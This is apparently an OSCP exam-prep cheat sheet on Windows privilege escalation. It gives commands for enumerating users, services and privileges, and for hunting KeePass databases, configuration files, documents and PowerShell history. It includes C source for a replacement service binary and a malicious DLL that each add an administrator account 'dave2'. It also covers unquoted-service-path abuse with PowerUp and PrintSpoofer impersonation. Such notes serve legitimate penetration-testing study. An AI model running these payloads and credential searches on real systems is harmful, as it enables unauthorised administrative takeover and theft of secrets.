# Privilege Escalation OSCP

#### Information to look for <a href="#information-to-look-for" id="information-to-look-for"></a>

**Situational Awareness**

* Username and hostname

```
whoami
whoami /priv
whoami /all
```

* Group memberships of the current user

```
whomai /groups
```

* Existing users and groups

```
net user
net localgroup
net localgroup <GroupName>
```

```
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember <GroupName>
```

* Operating system, version and architecture

```
systeminfo
```

* Network information

```
ipconfig /all
route print
netstat -ano
```

* Installed applications

```
# 32-bit
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
# 64-bit
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

* Running processes

```
Get-Process
```

**Hidden in Plain Sight**

* Users Home directory

```
tree /f C:\\Users\\
```

* KeePass Database

```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

* Configuration Files

```
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini,*.conf -File -Recurse -ErrorAction SilentlyContinue
```

* Documents and text files in users home directory

```
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

* RunAs

```
runas /user:backupadmin cmd
```

**PowerShell logs**

```
Get-History
(Get-PSReadlineOption).HistorySavePath
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type C:\Users\Public\Transcripts\transcript01.txt
```

**Automated Enumeration**

`winPEAS.ex`, `PowerUp.ps1`

#### Windows Services <a href="#windows-services" id="windows-services"></a>

**Service Binary Hijacking**

```
# Fails inside WinRM
Get-CimInstance -ClassName win32_service | Select Name,StartMode,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\xampp\apache\bin\httpd.exe"
```

```
# Program: adduser.c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

```
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

```
net stop httpd
shutdown /r /t 0 
net start httpd
```

**Service DLL Hijacking**

Ther order of loading a DLL

1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

Copy

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls BetaServer.exe
```

Use ProcessMonitor to investigate DLL Hijacking. Apply a filter and restart the process.

```
Restart-Service BetaService
$env:path
```

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

```
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```

**Unquoted Service Paths**

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```

```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

```
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```

#### Using Windows Components <a href="#using-windows-components" id="using-windows-components"></a>

**Scheduled Tasks**



```
schtasks /query /fo LIST /v
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

**Exploits**

* Installed Application Based Exploits
* Kernel Exploits
* Windows Service Accounts having SeImpersonatePrivilege



```
whoami /priv
.\PrintSpoofer64.exe -i -c powershell.exe
```

https://jlajara.gitlab.io/Potatoes\_Windows\_Privesc
